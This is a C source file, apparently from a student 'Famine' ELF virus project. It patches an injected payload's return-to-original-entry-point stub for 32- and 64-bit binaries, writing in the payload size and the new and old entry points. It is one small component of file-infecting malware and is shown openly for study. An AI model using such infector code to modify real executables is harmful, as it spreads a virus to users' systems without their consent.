/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   overwrite_payload.c                                :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mabouce <ma.sithis@gmail.com>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/08/26 16:12:30 by mabouce           #+#    #+#             */
/*   Updated: 2021/08/26 16:12:30 by mabouce          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

// Rewrite info in payload ret2oep.
void overwrite_payload_ret2oep(t_famine *famine)
{
    size_t ret2oep_offset;
    if (ARCH_32)
    {
        ret2oep_offset = find_ret2oep_offset_elf32(famine);
        // Rewrite payload size without ret2oep. + 2 to skip two first instructions and go to address.
        memcpy(famine->payload_data + ret2oep_offset + 1, (void *)(&(ret2oep_offset)), 4);
        // Rewrite new entry_point in payload ret2oep.
        memcpy(famine->payload_data + ret2oep_offset + 6, (void *)&(famine->new_entry_point), 4);
        // Rewrite old entry_point in payload ret2oep.
        memcpy(famine->payload_data + ret2oep_offset + 11, (void *)&(famine->old_entry_point), 4);
    }
    else if (ARCH_64)
    {
        ret2oep_offset = find_ret2oep_offset_elf64(famine);
        // Rewrite payload size without ret2oep. + 2 to skip two first instructions and go to address.
        memcpy(famine->payload_data + ret2oep_offset + 2, (void *)(&(ret2oep_offset)), 4);
        // Rewrite new entry_point in payload ret2oep.
        memcpy(famine->payload_data + ret2oep_offset + 8, (void *)&(famine->new_entry_point), 4);
        // Rewrite old entry_point in payload ret2oep.
        memcpy(famine->payload_data + ret2oep_offset + 14, (void *)&(famine->old_entry_point), 4);
    }
}